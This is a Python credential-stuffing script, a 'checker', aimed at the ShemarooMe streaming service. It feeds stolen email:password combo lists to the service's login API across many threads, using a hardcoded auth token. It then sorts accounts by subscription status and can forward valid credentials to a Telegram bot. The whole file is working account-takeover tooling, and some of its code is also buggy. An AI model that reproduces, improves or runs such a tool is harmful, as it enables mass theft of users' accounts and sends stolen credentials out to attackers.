import requests
import threading
# import ctypes
from tkinter import filedialog
from tkinter import *
from datetime import date
from time import sleep
import os
import re

# Assigning Variables
TotalCombos = 0
Checked = 0
Hits = 0
Custom = 0
Bad = 0
Retries = 0

checkerName = "ShemarooMe"
hitsFilename = "ShemarooMe Hits.txt"

# Functions

def saveHits(text, filename):
    file = open(filename, "a")
    file.write(text)
    file.close()

def clear():
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')

def Banner():
    clear()
    print('''    
        
        ░██████╗██╗░░██╗███████╗███╗░░░███╗░█████╗░██████╗░░█████╗░░█████╗░███╗░░░███╗███████╗
        ██╔════╝██║░░██║██╔════╝████╗░████║██╔══██╗██╔══██╗██╔══██╗██╔══██╗████╗░████║██╔════╝
        ╚█████╗░███████║█████╗░░██╔████╔██║███████║██████╔╝██║░░██║██║░░██║██╔████╔██║█████╗░░
        ░╚═══██╗██╔══██║██╔══╝░░██║╚██╔╝██║██╔══██║██╔══██╗██║░░██║██║░░██║██║╚██╔╝██║██╔══╝░░
        ██████╔╝██║░░██║███████╗██║░╚═╝░██║██║░░██║██║░░██║╚█████╔╝╚█████╔╝██║░╚═╝░██║███████╗
        ╚═════╝░╚═╝░░╚═╝╚══════╝╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝░╚════╝░░╚════╝░╚═╝░░░░░╚═╝╚══════╝

                    ░█████╗░██╗░░██╗███████╗░█████╗░██╗░░██╗███████╗██████╗░
                    ██╔══██╗██║░░██║██╔════╝██╔══██╗██║░██╔╝██╔════╝██╔══██╗
                    ██║░░╚═╝███████║█████╗░░██║░░╚═╝█████═╝░█████╗░░██████╔╝
                    ██║░░██╗██╔══██║██╔══╝░░██║░░██╗██╔═██╗░██╔══╝░░██╔══██╗
                    ╚█████╔╝██║░░██║███████╗╚█████╔╝██║░╚██╗███████╗██║░░██║
                    ░╚════╝░╚═╝░░╚═╝╚══════╝░╚════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝
    ''')
    print('\n                           [+] Developed By DE3P4K [+]\n')
    print('                              [+] t.me/DE3P4K07 [+]\n')

def Stat():
    print(f'Checked : {Checked}')
    print(f'Hits    : {Hits}')
    print(f'Custom  : {Custom}')
    print(f'Bad     : {Bad}')

Banner()
while 1:
    tg = input('Send HITS to Telegram? [Y/N] : ')
    if tg == 'y' or tg == 'Y':
        tgbot = 1
        print("\n")
        bot_token = input('Enter Bot Token : ')
        chat_id = input('Enter Chat ID : ')
        break
    elif tg =='n' or tg == 'N':
        tgbot = 0
        break
    else:
        print('Bad Input !\n')
        continue

def ShemarooMe(combo):
    global Hits
    global Checked
    global Custom
    global Bad
    global Retries
    global hitsFilename

    try:
        email = combo.split(":")[0]
        password = combo.split(":")[1].replace('\n', '')
    except:
        Checked+=1
        Bad+=1
        return
    
    headers={
        'Host': 'prod.api.shem.apisaranyu.in',
        'Content-Type': 'application/json; charset=UTF-8',
        'Accept-Encoding': 'gzip, deflate'
    }

    data={
        "auth_token":"QqqxkiSs9dxhxkem1pZU",
        "user":{
            "app_version":"Android ver : 7.1.2",
            "current_sign_in_ip":"185.229.59.218",
            "device_data":{
                "device_name":"samsung SM-N976N",
                "device_type":"android"
            },
            "email_id":email,
            "password":password,
            "region":"US"
        }
    }

    try:
        response = requests.post("https://prod.api.shem.apisaranyu.in/users/sign_in?auth_token=QqqxkiSs9dxhxkem1pZU&region=IN", headers=headers, json=data)
        print(response.text)
        if '"error":' in response.text:
            Checked+=1
            Bad+=1
            sleep(1)
        elif '"data":' in response.text:

            headers2={
                'Host': 'prod.api.shem.apisaranyu.in',
                'Accept-Encoding': 'gzip, deflate',
                'User-Agent': 'okhttp/4.8.0'
            }

            try:
                response2 = requests.get("https://prod.api.shem.apisaranyu.in/users/4a547388655a5c375896bba0e6ac7c7c/account?auth_token=QqqxkiSs9dxhxkem1pZU&region=US", headers=headers2)
                print(response2.text)
            except:
                # Retries+=1
                # ShemarooMe(combo)
                sleep(1)

            if '"is_subscribed":false' in response2.text:
                Custom+=1
                Checked+=1
                # print(f"[FREE] {email}:{password}")
                Stat()
                sleep(1)
            elif '"is_subscribed":true' in response2.text:
                Hits+=1
                Checked+=1
                x = re.search('(?<="active_plans":[).*(?=])')
                Stat()
                print(f"[VALID] {email}:{password} | Active Plans : {x}")
                if tgbot == 1:
                    message = f"[ShemarooME]\n➖➖➖➖➖➖➖➖➖➖➖➖➖\n{email} : {password}\nActive Plans : {x}\n➖➖➖➖➖➖➖➖➖➖➖➖➖\nChecker by @DE3P4K07"
                    url = f"https://api.telegram.org/bot{bot_token}/sendMessage?chat_id={chat_id}&text={message}"
                    requests.get(url).json()
            else:
                sleep(1)
    except:
        sleep(1)

clear()
# ctypes.windll.kernel32.SetConsoleTitleW(f"{checkerName} Checker | Load Combos | By DE3P4K")
Banner()
print("[+] Select Combo :")
root = Tk()
root.withdraw()
name=filedialog.askopenfilename(initialdir = "/",title = "Select a File", filetypes = (("Text files", "*.txt*"), ("all files", "*.*"))) #File Dialog
root.destroy()
file=open(name,"r",errors="ignore")
combosfile=file.readlines()
combofilename = os.path.basename(name)
TotalCombos = len(combosfile)
sleep(2)
clear()
Banner()
threads = []
clear()
# ctypes.windll.kernel32.SetConsoleTitleW(f"{checkerName} - Threads Starting | By DE3P4K")
Banner()
print(f'Loaded {combofilename} with {TotalCombos} Lines\n\n')

for combo in combosfile: #Check Each Combo in the File (It does use up a lot of ram tho..)
    t = threading.Thread(target=ShemarooMe, args=(combo,))
    t.start()
    threads.append(t)
    
for thread in threads:
    thread.join()
    
print("\n[+] Task Completed!")
print("[+] Hits : "+ str(Hits))
input("[+] Press Enter to Exit.\n")